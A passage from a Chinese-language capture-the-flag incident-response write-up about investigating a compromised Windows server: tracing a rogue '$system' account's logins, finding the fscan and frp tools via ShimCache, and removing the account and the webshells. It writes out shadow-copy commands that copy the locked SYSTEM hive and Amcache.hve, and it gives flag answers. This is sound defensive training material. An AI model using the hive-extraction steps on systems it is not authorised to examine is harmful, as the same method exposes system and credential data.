0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">devmgmt.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">设备管理器</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">查看和管理硬件驱动</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">diskmgmt.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">磁盘管理</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">分区、格式化、更改盘符</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">eventvwr</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">事件查看器</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">查看系统、安全、应用程序日志</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">taskschd.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">任务计划程序</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">管理定时任务</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">certmgr.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">证书管理</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">管理当前用户的证书</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">perfmon.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">性能监视器</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">监控 CPU、内存、磁盘实时性能</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">rsop.msc</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">策略结果集</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">查看当前生效的组策略设置</span></section></td></tr></tbody></table>  
  
目前已知新建的用户是$system  
，还需要找到它的登录IP和时间，这是三要素  
  
继续使用FullEventLogView  
筛选事件ID：4624  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia9EVJPvQKqCBGr3IVq2Au2X7Q0LXicPGcM9n14d5ggNraMr3jU101ebA/640?wx_fmt=png&from=appmsg "")  
  
如上图所示有421  
个项目，这显然是有点多的，那么在实战中我们又可根据登录类型继续筛选，网络连接远程登录的类型为3  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaxjV35nm9Sy6Ulh4TTxc7ia4rPO44Jns34OryW3rlNeKFNiaLcDIBq41g/640?wx_fmt=png&from=appmsg "")  
  
事件ID为3  
是因为此连接正在使用网络级别认证，实战中我们还可以通过事件ID：21  
来查看此IP是否登录成功  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaERISTJj0olJUaMl3SwZX9mlzffIFt1cRcAAtmda9KmEJQxWbt0qmyQ/640?wx_fmt=png&from=appmsg "")  
  
经过详细筛选后得到此IP为192.168.70.3  
，登录时间为2025/12/24 13:32:13(取最早)  
  
那么本题flag为：flag{$system&192.168.70.3&2025/12/24 13:32:13}  
#### 8. 恶意文件排查  
>   
> 攻击者为了进行内网渗透，上传了内网扫描及其它恶意文件，提交文件的所在路径，提交示例：flag{C:\Windows\System32}  
  
  
如果通过经验来讲，比如内网渗透关键词，我们会想到可能有：fscan  
、frp  
、Mimikatz  
等，那我们可以通过everything  
去搜，比如fscan  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaqpUddtw3aFgnVJWM2PiaJGxlura7oiaBCRAX82KlUQic7YW63KjJGnToQ/640?wx_fmt=png&from=appmsg "")  
  
但是这也仅限于碰运气，如果是自己开发的工具，就搜不到了，这个时候就需要用到Windows底层chache功能了，比如：AppCompatCache  
 (也称为 ShimCache)、Amcache  
 (Amcache.hve)，我们的Solar取证工具也在此中包含提取了这二者  
  
<table><thead><tr><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">伪影名称</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">存储形式</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">所在位置</span></section></th><th style="color: rgb(89, 89, 89);font-size: 14px;line-height: 1.5em;letter-spacing: 0.02em;text-align: left;font-weight: bold;background: none 0% 0% / auto no-repeat scroll padding-box border-box rgb(240, 240, 240);height: auto;border-style: solid;border-width: 1px;border-color: rgba(204, 204, 204, 0.4);border-radius: 0px;padding: 5px 10px;min-width: 85px;"><section><span leaf="">核心价值</span></section></th></tr></thead><tbody><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(255, 255, 255);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">AppCompatCache</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">注册表键值</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">HKLM\SYSTEM...\AppCompatCache</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">证明文件存在过、最后修改时间、执行标志</span></section></td></tr><tr style="color: rgb(89, 89, 89);background-attachment: scroll;background-clip: border-box;background-color: rgb(248, 248, 248);background-image: none;background-origin: padding-box;background-position-x: 0%;background-position-y: 0%;background-repeat: no-repeat;background-size: auto;width: auto;height: auto;"><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">Amcache.hve</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">独立 Hive 文件</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">C:\Windows\AppCompat\Programs\</span></section></td><td style="padding-top: 5px;padding-right: 10px;padding-bottom: 5px;padding-left: 10px;min-width: 85px;border-top-style: solid;border-bottom-style: solid;border-left-style: solid;border-right-style: solid;border-top-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-right-width: 1px;border-top-color: rgba(204, 204, 204, 0.4);border-bottom-color: rgba(204, 204, 204, 0.4);border-left-color: rgba(204, 204, 204, 0.4);border-right-color: rgba(204, 204, 204, 0.4);border-top-left-radius: 0px;border-top-right-radius: 0px;border-bottom-right-radius: 0px;border-bottom-left-radius: 0px;"><section><span leaf="">记录文件 Hash (SHA1)、首次安装时间、完整路径</span></section></td></tr></tbody></table>  
  
但是如果直接复制或打开他们，会直接提示被使用中  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iacl9ZiaCU9KxhMssQffKicIFnkd6PcGPcrduFKF8qYKM5QiaXt4r8aaRJA/640?wx_fmt=png&from=appmsg "")  
  
当 Windows 启动后，系统内核（System 进程）会以**独占模式**  
（Exclusive Lock）锁定这些文件，防止被外部程序修改或移动导致系统崩溃。因此，普通的文件复制命令（如 copy、xcopy）或直接右键复制都会失败。  
  
此时我们可以使用wmic进行操作，**复制卷影->提取卷影内文件->转为excel表格(可视化)**  
```
wmic shadowcopy call create Volume='C:\' # 创建C盘卷影
```  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iao95PmMuEJ57z8QEhzlTLt2xznj9MsCYCUn4uic3fmSicITLWHVCMOtmA/640?wx_fmt=png&from=appmsg "")  
```
vssadmin list shadows # 查找卷影副本路径
```  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iah1y4Q63icfUrlianQlKHpTia1XibicnkVnMPwR2TpoqtzruQFoiavVcyHxMw/640?wx_fmt=png&from=appmsg "")  
```
copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\AppCompat\Programs\Amcache.hve" C:\Users\Administrator\Desktop\Forensics\Amcache.hve # 提取 Amcache.hve  copy "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" C:\Users\Administrator\Desktop\Forensics\SYSTEM # 提取 SYSTEM Hive (含 AppCompatCache)
```  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaGsRgaxd9OVdx6mwfN7zUxia4Hv5ycEYzxPSN6EicVTCOQic049YLUnkgQ/640?wx_fmt=png&from=appmsg "")  
  
因为提取出来的文件是二进制，所以我们需要用工具转为表格，建议使用如下取证工具  
```
https://ericzimmerman.github.io/#!index.md
```  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaVj7Iv5pJ2iaZNkj5cvQibDkUKIUwBx3gnFO1GcBLAJZxeTneBOdhzAwQ/640?wx_fmt=png&from=appmsg "")  
  
以SYSTEM为例，需要下载AppCompatCacheParser  
，然后将其解压后可执行程序与SYSTEM放在同一目录下并打开CMD运行如下目录  
```
AppCompatCacheParser.exe -f "SYSTEM" --csv "." --nl
```  
  
加上--nl  
 后，工具会尝试直接读取主文件并忽略脏标志。如果文件损坏严重，可能还是会报错，但大多数情况下能跑通  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ia72PrWRmr7OdLiaboEeqUVp8Qiab4Eo8vibQ2oHNUq2Yjl7flwgCeEc0yw/640?wx_fmt=png&from=appmsg "")  
  
然后打开此表格后试图大致如下  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaj18CHCpYK3pgOTqEZ2Huja7hD5NVwQ36XVfATeRnJxwQ6xbgo2IDxg/640?wx_fmt=png&from=appmsg "")  
  
目前来看是非常乱的，我们可以筛选Executed  
，意思就是程序是否已执行，因为如果是内网漏扫，还是内网穿透，想要利用功能必须执行程序  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaC0k75PBLKwJlMtMeiccuyupWibicXGvs7M9Cf4qdJEVltdAyCibkHuerYg/640?wx_fmt=png&from=appmsg "")  
  
如上图所示，在筛选后我们发现fscan和frp运行过，且目录为：C:\Users\Administrator\Downloads\  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5ianicyR45EQMnjeaQRibicsFrs2ic7623rhcxPewltksIUEWibO5xlFUERctQ/640?wx_fmt=png&from=appmsg "")  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaWGF5wznqDfRbWQgc1VEfxMbRn3NptDgN0pdowkXBBRmcA1YRarY3eQ/640?wx_fmt=png&from=appmsg "")  
  
且通过fscan扫描结果看到内网另一台机器存在nacos漏洞  
  
当然，留给大家一个自学思路，前面提到的Amcache.hve  
实则记录了更清晰的日志，程序在几点几分运行的，这样更好排查溯源时间线，大家可以自行搜索、询问AI应如何转为excel表格  
  
所以本题flag为：flag{C:\Users\Administrator\Downloads}  
#### 9. 安全加固  
>   
> 清除攻击者用于权限维持添加的用户，清除完毕后前往C:\Users\Administrator\Desktop\flag\1.txt读取flag  
  
  
前面排查到的新增用户为$system  
而且登录成功了，在安全加固中一定要将不明恶意用户删除或禁用  
  
执行：net user $system /del  
命令删除  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iadYT7fUfGFcJ0efwIXzGibeY25edic57CcIukYtpq930nFZl45Tc4b7Jg/640?wx_fmt=png&from=appmsg "")  
  
经过删除后再次执行net user  
看到已经删除完毕，前往flag目录读取flag  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaWbE5ZS0vNUnfw54daBw5tws3XDW24SoHRaQTfbpeDRIJ3ZMYJaEiaAw/640?wx_fmt=png&from=appmsg "")  
  
故本题flag为：flag{d47cab4549e08c5227d2afd5d4e1a051}  
#### 10. 安全加固  
  
清除攻击者上传的所有webshell，清除完毕后前往C:\Users\Administrator\Desktop\flag\2.txt  
读取flag  
  
前面已知攻击者上传了很多的webshell，哥斯拉的webshell还被上线成功了，防止后续再次连接，这也是安全加固最重要的一环，找到相关aspx：C:\inetpub\wwwroot\plugins\Ueditor\net\upload\image\20251224  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaeyjSkibnZeNtqkEo5OS8hr5icf83bP7PY7XsRE2p2H4cAlcQaLMwkJlQ/640?wx_fmt=png&from=appmsg "")  
  
如果路径太复杂，直接everything查找*.aspx  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaL9SDKZosVHl5r9caBQ707T1fQRV0rDREWIoqP2oNc9TSmFMcsVlSKg/640?wx_fmt=png&from=appmsg "")  
  
全选删除后前往flag目录查看flag  
  
![fig:](https://mmbiz.qpic.cn/mmbiz_png/icdGEWOnYLpNyzBXPd5gNXibH7bBNaen5iaL4qbiarVnCG6tGrgn73EeDWO5Cv2rzvkOwaR8HVqXNicBT096fACNroA/640?wx_fmt=png&from=appmsg "")  
  
